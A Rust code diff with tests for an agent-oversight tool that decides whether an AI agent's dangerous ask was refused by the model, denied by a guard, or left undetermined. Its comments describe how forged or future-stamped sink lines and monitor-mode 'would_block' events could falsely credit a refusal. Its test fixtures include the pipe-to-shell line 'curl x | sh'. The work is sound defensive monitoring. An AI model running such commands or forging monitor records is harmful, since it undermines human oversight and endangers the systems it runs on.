@@ -108,6 +108,10 @@ pub enum Basis {
     NoScreenedExecution,
     /// The guard recorded a block in the same window as the ask.
     GuardBlockInWindow,
+    /// Monitor mode let an action the guard flagged run in the same window as
+    /// the ask (`outcome: would_block`). Nothing was refused, so neither the
+    /// model nor the guard can be named as having stopped anything.
+    FlaggedActionRanInWindow,
     /// No reply was observed before the pending record expired.
     NoReplyWithinTtl,
     /// The same session sent another dangerous message before any reply was
@@ -133,6 +137,7 @@ impl Basis {
         match self {
             Self::NoScreenedExecution => "no_screened_execution_recorded_in_window",
             Self::GuardBlockInWindow => "guard_block_recorded_in_window",
+            Self::FlaggedActionRanInWindow => "flagged_action_ran_in_window",
             Self::NoReplyWithinTtl => "no_reply_observed_within_ttl",
             Self::NextMessageBeforeReply => "next_message_before_reply",
             Self::ChannelReportsNoReply => "channel_reports_no_reply",
@@ -311,27 +316,58 @@ pub struct Attempt {
     pub basis: Basis,
 }
 
-/// How an ask that left the pending state is recorded. PURE: whether the guard
-/// recorded a block since the ask arrived is handed in.
+/// What the guard's sink holds, in one ask's window, that bears on its
+/// outcome. Built by [`guard_window`] from lines another process wrote.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+pub struct GuardWindow {
+    /// Monitor mode let an action the guard flagged run (`would_block`), on a
+    /// line that names the agent that was asked or names no agent.
+    pub flagged_ran: bool,
+    /// The guard refused an action (`blocked`, enforce mode), on a line that
+    /// names the agent that was asked.
+    pub refused_this_agent: bool,
+    /// The guard refused an action on a line nothing ties to this ask: the
+    /// line names no agent, or the ask does not name one.
+    pub refused_unattributed: bool,
+}
+
+/// How an ask that left the pending state is recorded. PURE: what the guard
+/// recorded in the ask's window is handed in.
 ///
-/// A model refusal is concluded only from a reply that was observed. Every
-/// other way out says the outcome is unknown, unless a guard block landed in
-/// the same window, which is a control refusing something and is named as
-/// such. A superseded ask must never read as "the model held": a follow-up
-/// message would otherwise be enough to stamp a refusal on an attack that is
-/// still running. An expired ask is not correlated with blocks at all, because
-/// its window can be hours wide by the time a later hook call flushes it.
-pub fn outcome(leaving: Leaving, guard_blocked_since_ask: bool, recorded_at: u64) -> Attempt {
+/// A model refusal is concluded only from a reply that was observed, and only
+/// when nothing in the window says otherwise. The guard is named as the
+/// decider only for a refusal it made in enforce mode, on a line naming the
+/// agent that was asked, of a turn whose reply was observed.
+///
+/// Everything else says the outcome is unknown, with the strongest thing the
+/// window held as its basis:
+///
+/// - an action the guard flagged that monitor mode let run outranks the rest:
+///   it is the one fact that says the attack may have worked, and reading it
+///   as "the model declined" or "the guard refused" would hide it;
+/// - a refusal that cannot be tied to this ask is reported as having been in
+///   the window and nothing more;
+/// - an ask that left with no reply observed is never settled by the sink. The
+///   sink is a file the guarded agent's own account can append to, so one
+///   line written there must not be able to turn an ask nothing answered into
+///   "stopped by InnerWarden". A superseded ask must never read as "the model
+///   held" either: a follow-up message would otherwise be enough to stamp a
+///   refusal on an attack that is still running.
+///
+/// An expired ask is not correlated at all, because its window can be hours
+/// wide by the time a later hook call flushes it.
+pub fn outcome(leaving: Leaving, window: GuardWindow, recorded_at: u64) -> Attempt {
+    let refused = window.refused_this_agent || window.refused_unattributed;
     let (decider, basis) = match leaving.departure {
         Departure::Replied {
             declared: Some(decider),
         } => (decider, Basis::Declared),
         Departure::Expired => (Decider::Undetermined, Basis::NoReplyWithinTtl),
-        Departure::Replied { declared: None } | Departure::Unanswered(_)
-            if guard_blocked_since_ask =>
-        {
+        _ if window.flagged_ran => (Decider::Undetermined, Basis::FlaggedActionRanInWindow),
+        Departure::Replied { declared: None } if window.refused_this_agent => {
             (Decider::GuardDenied, Basis::GuardBlockInWindow)
         }
+        _ if refused => (Decider::Undetermined, Basis::GuardBlockInWindow),
         Departure::Replied { declared: None } => {
             (Decider::ModelRefused, Basis::NoScreenedExecution)
         }
@@ -352,6 +388,23 @@ pub fn needs_block_correlation(departure: Departure) -> bool {
         departure,
         Departure::Expired | Departure::Replied { declared: Some(_) }
     )
+}
+
+/// The seconds of the sink an ask is correlated with: from the ask to the
+/// moment it is recorded, and never past that, so a line stamped in the
+/// future (anything can append one) never reaches an ask. An ask that left
+/// with no reply is held to the length of one turn, the hold a webchat ask
+/// gets: a superseded ask can be fifteen minutes old, and a block from then
+/// says nothing about it.
+pub fn correlation_window(leaving: &Leaving, recorded_at: u64) -> (u64, u64) {
+    let from = leaving.ask.asked_at;
+    let until = match leaving.departure {
+        Departure::Unanswered(_) => {
+            recorded_at.min(from.saturating_add(UNREPORTED_REPLY_WAIT_SECONDS))
+        }
+        Departure::Replied { .. } | Departure::Expired => recorded_at,
+    };
+    (from, until)
 }
 
 /// The line the paid agent ingests.
@@ -773,25 +826,62 @@ fn mine_requested_at(words: &[String], at: usize) -> bool {
             .any(|word| COINS.contains(&word.as_str()))
 }
 
-/// Did the guard record a block at or after `since` in this slice of the sink?
+/// What the guard recorded between `from` and `until` (inclusive) in this
+/// slice of the sink, as it bears on an ask made to `agent` (empty when the
+/// ask names none).
 ///
 /// This is a TIME-WINDOW correlation and nothing stronger. The conversation
 /// session key and the guard's own session label come from different surfaces
 /// and cannot be joined, so the record says `guard_block_recorded_in_window`
 /// rather than claiming the block answered this ask.
-pub fn guard_block_since(sink_tail: &str, since: u64) -> bool {
-    sink_tail.lines().any(|line| {
+///
+/// Only a `guard.blocked` line counts, and only for what its `outcome` says:
+/// `blocked` (in enforce mode) is a refusal, `would_block` is monitor mode
+/// letting a flagged action run. A line with neither refused nothing. A line
+/// naming another agent is someone else's action and is left out; a line
+/// naming no agent can be anyone's, so it can make an outcome less certain but
+/// never credit the guard.
+pub fn guard_window(sink_tail: &str, agent: &str, from: u64, until: u64) -> GuardWindow {
+    let mut window = GuardWindow::default();
+    for line in sink_tail.lines() {
         let Ok(value) = serde_json::from_str::<Value>(line) else {
-            return false;
+            continue;
         };
         if value.get("kind").and_then(Value::as_str) != Some("guard.blocked") {
-            return false;
+            continue;
         }
-        value
+        let in_window = value
             .get("ts")
             .and_then(Value::as_u64)
-            .is_some_and(|ts| ts >= since)
-    })
+            .is_some_and(|ts| ts >= from && ts <= until);
+        if !in_window {
+            continue;
+        }
+        let named = value
+            .get("agent")
+            .and_then(Value::as_str)
+            .filter(|named| !named.is_empty());
+        let this_agent = match named {
+            Some(named) if !agent.is_empty() => {
+                if named != agent {
+                    continue;
+                }
+                true
+            }
+            _ => false,
+        };
+        let enforce = value
+            .get("mode")
+            .and_then(Value::as_str)
+            .is_none_or(|mode| mode == "enforce");
+        match value.get("outcome").and_then(Value::as_str) {
+            Some("would_block") => window.flagged_ran = true,
+            Some("blocked") if enforce && this_agent => window.refused_this_agent = true,
+            Some("blocked") if enforce => window.refused_unattributed = true,
+            _ => {}
+        }
+    }
+    window
 }
 
 /// Redact secrets out of the text, collapse it onto one line, and bound it.
@@ -1307,39 +1397,54 @@ mod tests {
         assert!(state.take(&format!("s{}", MAX_PENDING + 9)).is_some());
     }
 
+    const NOTHING: GuardWindow = GuardWindow {
+        flagged_ran: false,
+        refused_this_agent: false,
+        refused_unattributed: false,
+    };
+    const REFUSED_THIS_AGENT: GuardWindow = GuardWindow {
+        refused_this_agent: true,
+        ..NOTHING
+    };
+    const REFUSED_UNATTRIBUTED: GuardWindow = GuardWindow {
+        refused_unattributed: true,
+        ..NOTHING
+    };
+    const FLAGGED_RAN: GuardWindow = GuardWindow {
+        flagged_ran: true,
+        ..NOTHING
+    };
+
+    const NO_REPLY: [NoReply; 4] = [
+        NoReply::NextMessage,
+        NoReply::ChannelReportsNone,
+        NoReply::PendingLimit,
+        NoReply::StateUnavailable,
+    ];
+
     /// An ask that leaves without an observed reply is never recorded as the
-    /// model declining, whatever the reason it left. Only a guard block in the
-    /// window changes the decider, and that names the guard.
+    /// model declining, whatever the reason it left.
     ///
     /// FAILS ON REVERT: settle a superseded ask the way a reply settles one
     /// and the first assert sees `model_refused`.
     #[test]
     fn a_superseded_ask_is_never_called_model_refused() {
-        for reason in [
-            NoReply::NextMessage,
-            NoReply::ChannelReportsNone,
-            NoReply::PendingLimit,
-            NoReply::StateUnavailable,
-        ] {
+        for reason in NO_REPLY {
             let leaving = Leaving {
                 ask: pending("s1", 100),
                 departure: Departure::Unanswered(reason),
             };
-            let unknown = outcome(leaving.clone(), false, 150);
+            let unknown = outcome(leaving, NOTHING, 150);
             assert_eq!(unknown.decider, Decider::Undetermined, "{reason:?}");
             assert_eq!(unknown.basis, reason.basis(), "{reason:?}");
             assert!(!unknown.decider.enforced());
-
-            let blocked = outcome(leaving, true, 150);
-            assert_eq!(blocked.decider, Decider::GuardDenied, "{reason:?}");
-            assert_eq!(blocked.basis, Basis::GuardBlockInWindow);
         }
         let line = attempt_line(&outcome(
             Leaving {
                 ask: pending("s1", 100),
                 departure: Departure::Unanswered(NoReply::NextMessage),
             },
-            false,
+            NOTHING,
             150,
         ));
         assert_eq!(line["decider"], "undetermined");
@@ -1347,39 +1452,122 @@ mod tests {
         assert_eq!(line["enforced"], false);
     }
 
-    /// The settlements that existed before are unchanged: a reply with no
-    /// block is the model declining, a reply with a block is the guard, a
-    /// stated decider is taken as stated, and an expired ask is unknown and is
-    /// not correlated with blocks, because its window can be hours wide.
+    /// THE defect: an ask that left with no reply observed (a webchat ask
+    /// settled after its hold, a superseded ask, the oldest over the bound)
+    /// was recorded `guard_denied`, `enforced: true` on the strength of one
+    /// sink line, and the dashboard said InnerWarden stopped it. The sink is a
+    /// file the guarded agent's own account can append to, so a line there
+    /// never settles an ask nothing answered: what it held becomes the basis,
+    /// and the decider stays unknown.
+    ///
+    /// FAILS ON REVERT: let a refusal in the window name the guard for an
+    /// unanswered ask again, and the first assert sees `guard_denied`.
     #[test]
-    fn replies_and_expiry_settle_as_they_did() {
+    fn a_sink_line_never_settles_an_ask_nothing_answered() {
+        for reason in NO_REPLY {
+            let leave = || Leaving {
+                ask: pending("s1", 100),
+                departure: Departure::Unanswered(reason),
+            };
+            for window in [REFUSED_THIS_AGENT, REFUSED_UNATTRIBUTED] {
+                let attempt = outcome(leave(), window, 150);
+                assert_eq!(attempt.decider, Decider::Undetermined, "{reason:?}");
+                assert_eq!(attempt.basis, Basis::GuardBlockInWindow, "{reason:?}");
+                assert_eq!(attempt_line(&attempt)["enforced"], false);
+            }
+            let ran = outcome(leave(), FLAGGED_RAN, 150);
+            assert_eq!(
+                (ran.decider, ran.basis),
+                (Decider::Undetermined, Basis::FlaggedActionRanInWindow),
+                "{reason:?}"
+            );
+        }
+    }
+
+    /// Monitor mode records a flagged action it let run as `would_block`.
+    /// That is the one window fact that says the attack may have worked, so it
+    /// outranks everything else: a reply is not the model declining, and a
+    /// refusal of something else in the same window is not the guard stopping
+    /// this. Before, any `guard.blocked` line named the guard, so a miner
+    /// monitor mode let run read "stopped by InnerWarden".
+    ///
+    /// FAILS ON REVERT: drop the `flagged_ran` arm and a reply with a
+    /// would-block in its window reads `model_refused`.
+    #[test]
+    fn a_flagged_action_that_ran_is_never_credited_to_anyone() {
         let leave = |departure| Leaving {
             ask: pending("s1", 100),
             departure,
         };
-        let refused = outcome(leave(Departure::Replied { declared: None }), false, 120);
+        for window in [
+            FLAGGED_RAN,
+            GuardWindow {
+                refused_this_agent: true,
+                ..FLAGGED_RAN
+            },
+        ] {
+            let attempt = outcome(leave(Departure::Replied { declared: None }), window, 150);
+            assert_eq!(
+                (attempt.decider, attempt.basis),
+                (Decider::Undetermined, Basis::FlaggedActionRanInWindow),
+                "{window:?}"
+            );
+            assert_eq!(
+                attempt_line(&attempt)["decider_basis"],
+                "flagged_action_ran_in_window"
+            );
+        }
+    }
+
+    /// The settlements that existed before still hold where the evidence
+    /// carries them: a reply with nothing in its window is the model
+    /// declining, a reply with this agent's refusal in its window is the
+    /// guard, a stated decider is taken as stated, and an expired ask is
+    /// unknown and is not correlated with blocks, because its window can be
+    /// hours wide. A refusal no line ties to this agent is reported as being
+    /// in the window, and credits no one.
+    #[test]
+    fn replies_and_expiry_settle_on_what_the_window_holds() {
+        let leave = |departure| Leaving {
+            ask: pending("s1", 100),
+            departure,
+        };
+        let refused = outcome(leave(Departure::Replied { declared: None }), NOTHING, 120);
         assert_eq!(
             (refused.decider, refused.basis),
             (Decider::ModelRefused, Basis::NoScreenedExecution)
         );
-        let denied = outcome(leave(Departure::Replied { declared: None }), true, 120);
+        let denied = outcome(
+            leave(Departure::Replied { declared: None }),
+            REFUSED_THIS_AGENT,
+            120,
+        );
         assert_eq!(
             (denied.decider, denied.basis),
             (Decider::GuardDenied, Basis::GuardBlockInWindow)
+        );
+        let unattributed = outcome(
+            leave(Departure::Replied { declared: None }),
+            REFUSED_UNATTRIBUTED,
+            120,
+        );
+        assert_eq!(
+            (unattributed.decider, unattributed.basis),
+            (Decider::Undetermined, Basis::GuardBlockInWindow)
         );
         let declared = outcome(
             leave(Departure::Replied {
                 declared: Some(Decider::KernelDenied),
             }),
-            false,
+            NOTHING,
             120,
         );
         assert_eq!(
             (declared.decider, declared.basis),
             (Decider::KernelDenied, Basis::Declared)
         );
-        for blocked in [false, true] {
-            let expired = outcome(leave(Departure::Expired), blocked, 2_000);
+        for window in [NOTHING, REFUSED_THIS_AGENT, FLAGGED_RAN] {
+            let expired = outcome(leave(Departure::Expired), window, 2_000);
             assert_eq!(
                 (expired.decider, expired.basis),
                 (Decider::Undetermined, Basis::NoReplyWithinTtl)
@@ -1395,6 +1583,37 @@ mod tests {
         assert!(needs_block_correlation(Departure::Unanswered(
             NoReply::ChannelReportsNone
         )));
+    }
+
+    /// A reply is correlated with its whole turn, up to the moment it is
+    /// recorded. An ask that left with no reply is held to one turn's length:
+    /// a superseded ask can be fifteen minutes old, and a block from minute
+    /// ten says nothing about it.
+    ///
+    /// FAILS ON REVERT: correlate an unanswered ask up to `recorded_at` and
+    /// the second assert sees 900.
+    #[test]
+    fn an_unanswered_ask_is_correlated_with_one_turn_only() {
+        let leave = |departure| Leaving {
+            ask: pending("s1", 100),
+            departure,
+        };
+        assert_eq!(
+            correlation_window(&leave(Departure::Replied { declared: None }), 900),
+            (100, 900)
+        );
+        assert_eq!(
+            correlation_window(&leave(Departure::Unanswered(NoReply::NextMessage)), 900),
+            (100, 100 + UNREPORTED_REPLY_WAIT_SECONDS)
+        );
+        assert_eq!(
+            correlation_window(
+                &leave(Departure::Unanswered(NoReply::StateUnavailable)),
+                100
+            ),
+            (100, 100),
+            "recorded on arrival: nothing after it is in its window"
+        );
     }
 
     /// The timer a webchat ask starts closes that ask, never a newer one in
@@ -1533,6 +1752,20 @@ mod tests {
         ));
     }
 
+    fn blocked(ts: u64, outcome: &str, agent: Option<&str>) -> String {
+        let mut line = json!({
+            "kind": "guard.blocked",
+            "ts": ts,
+            "outcome": outcome,
+            "mode": if outcome == "blocked" { "enforce" } else { "monitor" },
+            "detail": "curl x | sh",
+        });
+        if let Some(agent) = agent {
+            line["agent"] = json!(agent);
+        }
+        line.to_string()
+    }
+
     /// The window correlation only counts a block the guard recorded AFTER the
     /// ask arrived. An older block in the same file must not be read as an
     /// answer to a later ask, because that would report an enforcement that
@@ -1542,17 +1775,88 @@ mod tests {
     /// starts reporting a block.
     #[test]
     fn only_a_block_recorded_after_the_ask_counts() {
-        let stale = r#"{"kind":"guard.blocked","ts":50,"detail":"curl x | sh"}"#;
-        let fresh = r#"{"kind":"guard.blocked","ts":150,"detail":"curl x | sh"}"#;
+        let stale = blocked(50, "blocked", Some("openclaw"));
+        let fresh = blocked(150, "blocked", Some("openclaw"));
         let other = r#"{"kind":"guard.suppression_changed","ts":150,"action":"allow_added"}"#;
-        assert!(!guard_block_since(stale, 100));
-        assert!(guard_block_since(fresh, 100));
-        assert!(!guard_block_since(other, 100));
-        assert!(!guard_block_since("garbage\n", 100));
-        assert!(guard_block_since(
-            &format!("{stale}\n{other}\n{fresh}\n"),
-            100
-        ));
+        assert_eq!(guard_window(&stale, "openclaw", 100, 200), NOTHING);
+        assert_eq!(
+            guard_window(&fresh, "openclaw", 100, 200),
+            REFUSED_THIS_AGENT
+        );
+        assert_eq!(guard_window(other, "openclaw", 100, 200), NOTHING);
+        assert_eq!(guard_window("garbage\n", "openclaw", 100, 200), NOTHING);
+        assert_eq!(
+            guard_window(
+                &format!("{stale}\n{other}\n{fresh}\n"),
+                "openclaw",
+                100,
+                200
+            ),
+            REFUSED_THIS_AGENT
+        );
+    }
+
+    /// A monitor-mode `would_block` is a flagged action that RAN. It used to
+    /// count as a block, so a monitor-only host recorded an ask as stopped by
+    /// the guard while the action ran.
+    ///
+    /// FAILS ON REVERT: count every `guard.blocked` line as a refusal again
+    /// and the would-block reads as one.
+    #[test]
+    fn a_would_block_is_an_action_that_ran_not_a_refusal() {
+        let monitor = blocked(150, "would_block", Some("openclaw"));
+        assert_eq!(guard_window(&monitor, "openclaw", 100, 200), FLAGGED_RAN);
+        // One with no agent can be this agent's, so it still unsettles.
+        let anonymous = blocked(150, "would_block", None);
+        assert_eq!(guard_window(&anonymous, "openclaw", 100, 200), FLAGGED_RAN);
+        // A line with no outcome, or one the guard does not write, refused
+        // nothing: the bare line a forger writes first.
+        let bare = r#"{"kind":"guard.blocked","ts":150}"#;
+        let odd = blocked(150, "allowed", Some("openclaw"));
+        assert_eq!(guard_window(bare, "openclaw", 100, 200), NOTHING);
+        assert_eq!(guard_window(&odd, "openclaw", 100, 200), NOTHING);
+        // `blocked` outside enforce mode is not a refusal either.
+        let contradictory = r#"{"kind":"guard.blocked","ts":150,"outcome":"blocked","mode":"monitor","agent":"openclaw"}"#;
+        assert_eq!(guard_window(contradictory, "openclaw", 100, 200), NOTHING);
+    }
+
+    /// A line stamped after the ask was recorded never reaches it. Anything
+    /// that can append to the sink can stamp a line years ahead, and one such
+    /// line used to turn every later ask into a guard refusal until it left
+    /// the tail.
+    ///
+    /// FAILS ON REVERT: drop the `until` bound and the future line counts.
+    #[test]
+    fn a_line_stamped_in_the_future_never_correlates() {
+        let future = blocked(4_102_444_800, "blocked", Some("openclaw"));
+        assert_eq!(guard_window(&future, "openclaw", 100, 200), NOTHING);
+        let at_the_bound = blocked(200, "blocked", Some("openclaw"));
+        assert_eq!(
+            guard_window(&at_the_bound, "openclaw", 100, 200),
+            REFUSED_THIS_AGENT
+        );
+    }
+
+    /// Another agent's block is another agent's action: an unrelated Claude
+    /// Code refusal must not settle what an OpenClaw chat ask became. A line
+    /// that names no agent, or an ask that names none, cannot be tied either
+    /// way, so it is reported as being in the window and credits no one.
+    ///
+    /// FAILS ON REVERT: ignore the `agent` field and the Claude Code refusal
+    /// reads as this agent's.
+    #[test]
+    fn a_block_is_credited_only_to_the_agent_it_names() {
+        let theirs = blocked(150, "blocked", Some("claude-code"));
+        assert_eq!(guard_window(&theirs, "openclaw", 100, 200), NOTHING);
+        let theirs_ran = blocked(150, "would_block", Some("claude-code"));
+        assert_eq!(guard_window(&theirs_ran, "openclaw", 100, 200), NOTHING);
+        let anonymous = blocked(150, "blocked", None);
+        assert_eq!(
+            guard_window(&anonymous, "openclaw", 100, 200),
+            REFUSED_UNATTRIBUTED
+        );
+        let named = blocked(150, "blocked", Some("openclaw"));
+        assert_eq!(guard_window(&named, "", 100, 200), REFUSED_UNATTRIBUTED);
     }
 
     #[test]
